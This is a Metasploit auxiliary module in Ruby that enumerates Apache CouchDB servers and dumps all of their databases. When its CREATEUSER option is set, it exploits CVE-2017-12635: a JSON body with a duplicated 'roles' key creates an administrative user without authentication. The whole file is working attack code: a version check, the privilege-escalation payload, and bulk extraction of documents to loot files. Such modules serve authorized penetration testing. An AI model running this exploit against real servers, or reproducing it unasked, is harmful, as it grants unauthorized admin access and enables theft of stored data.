##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'CouchDB Enum Utility',
      'Description' => %q{
        This module enumerates databases on CouchDB using the REST API
        (without authentication by default).
      },
      'References'  =>
        [
          ['CVE', '2017-12635'],
          ['URL', 'https://justi.cz/security/2017/11/14/couchdb-rce-npm.html'],
          ['URL', 'https://wiki.apache.org/couchdb/HTTP_database_API']
        ],
      'Author'      =>
        [
          'Max Justicz', # Vulnerability discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>', # Metasploit module
          'Hendrik Van Belleghem', # (@hendrikvb) Database dump enhancements
          'Green-m <greenm.xxoo[at]gmail.com>' # Portions from apache_couchdb_cmd_exec.rb used
        ],
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(5984),
        OptString.new('TARGETURI', [true, 'Path to list all the databases', '/_all_dbs']),
        OptBool.new('SERVERINFO', [true, 'Print server info', false]),
        OptBool.new('CREATEUSER', [true, 'Create Administrative user', false]),
        OptString.new('HttpUsername', [true, 'CouchDB Username', Rex::Text.rand_text_alpha(12)]),
        OptString.new('HttpPassword', [true, 'CouchDB Password', Rex::Text.rand_text_alpha(12)]),
        OptString.new('ROLES', [true, 'CouchDB Roles', '_admin'])

      ])
  end

  def valid_response(res)
    return res.code == 200 && res.headers['Server'].include?('CouchDB')
  end

  def get_version
    @version = nil

    begin
      res = send_request_cgi(
        'uri'    => '/',
        'method' => 'GET'
      )
    rescue Rex::ConnectionError
      vprint_bad("#{peer} - Connection failed")
      return false
    end

    unless res
      vprint_bad("#{peer} - No response, check if it is CouchDB.")
      return false
    end

    if res && res.code == 401
      print_bad("#{peer} - Authentication required.")
      return false
    end

    if res && res.code == 200
      res_json = res.get_json_document

      if res_json.empty?
        vprint_bad("#{peer} - Cannot parse the response, seems like it's not CouchDB.")
        return false
      end

      @version = res_json['version'] if res_json['version']
      return true
    end

    vprint_warning("#{peer} - Version not found")
    true
  end

  def check
    return Exploit::CheckCode::Unknown unless get_version
    version = Gem::Version.new(@version)
    return Exploit::CheckCode::Unknown if version.version.empty?
    vprint_good("#{peer} - Found CouchDB version #{version}")

    return Exploit::CheckCode::Appears if version < Gem::Version.new('1.7.0') || version.between?(Gem::Version.new('2.0.0'), Gem::Version.new('2.1.0'))

    Exploit::CheckCode::Safe
  end

  def get_dbs(auth)
    begin
      res = send_request_cgi(
        'uri'    => normalize_uri(target_uri.path),
        'method' => 'GET'
      )

      temp = JSON.parse(res.body)
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, JSON::ParserError => e
      print_error("#{peer} - The following Error was encountered: #{e.class}")
      return
    end

    unless valid_response(res)
      print_error("#{peer} - Unable to enum, received \"#{res.code}\"")
      return
    end

    print_status("#{peer} - Enumerating Databases...")
    results = JSON.pretty_generate(temp)
    print_good("#{peer} - Databases:\n\n#{results}\n")
     path = store_loot(
      'couchdb.enum',
      'application/json',
      rhost,
      results,
      'CouchDB Databases'
    )

    print_good("#{peer} - File saved in: #{path}")
    res.get_json_document.each do |db|
      r = send_request_cgi(
        'uri' => normalize_uri(target_uri.path, "/#{db}/_all_docs"),
        'method'=> 'GET',
        'authorization' => auth,
        'vars_get' => {'include_docs' => 'true', 'attachments' => 'true'}
       )
       if r.code != 200
         print_bad("#{peer} - Error retrieving database. Consider providing credentials or setting CREATEUSER and rerunning.")
         return
       end
       temp = JSON.parse(r.body)
       results = JSON.pretty_generate(temp)
       path = store_loot(
         "couchdb.#{db}",
         "application/json",
         rhost,
         results,
         "CouchDB Databases"
       )
       print_good("#{peer} - #{db} saved in: #{path}")
    end
  end

  def get_server_info(auth)
    begin
      res = send_request_cgi(
        'uri'    => '/',
        'method' => 'GET'
      )

      temp = JSON.parse(res.body)
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, JSON::ParserError => e
      print_error("#{peer} - The following Error was encountered: #{e.class}")
      return
    end

    unless valid_response(res)
      print_error("#{peer} - Unable to enum, received \"#{res.code}\"")
      return
    end

    # Example response: {"couchdb":"Welcome","uuid":"6f08e89795bd845efc6c2bf3d57799e5","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}

    print_good("#{peer} - #{JSON.pretty_generate(temp)}")
    report_service(
      host: rhost,
      port: rport,
      name: 'couchdb',
      proto: 'tcp',
      info: res.body
    )
  end

  def create_user
    username = datastore['HttpUsername']
    password = datastore['HttpPassword']
    roles = datastore['ROLES']
    timeout = datastore['TIMEOUT']
    version = @version

    data = %Q({
"type": "user",
"name": "#{username}",
"roles": ["#{roles}"],
"roles": [],
"password": "#{password}"
})
    res = send_request_cgi(
    { 'uri'    => "/_users/org.couchdb.user:#{username}", # http://hostname:port/_users/org.couchdb.user:username
      'method' => 'PUT',
      'ctype'  => 'text/json',
      'data'   => data,
    }, timeout)

    unless res && res.code == 200
      print_error("#{peer} - Change Failed")
      return
    end

    print_good("#{peer} - User #{username} created with password #{password}. Connect to #{full_uri('/_utils/')} to login.")
  end

  def run
    username = datastore['HttpUsername']
    password = datastore['HttpPassword']

    if datastore['CREATEUSER']
      fail_with(Failure::Unknown, 'get_version failed in run') unless get_version
      version = Gem::Version.new(@version)
      print_good("#{peer} - Found CouchDB version #{version}")
      create_user if version < Gem::Version.new('1.7.0') || version.between?(Gem::Version.new('2.0.0'), Gem::Version.new('2.1.0'))
    end
    auth = basic_auth(username, password) if username && password
    get_server_info(auth) if datastore['SERVERINFO']
    get_dbs(auth)
  end
end
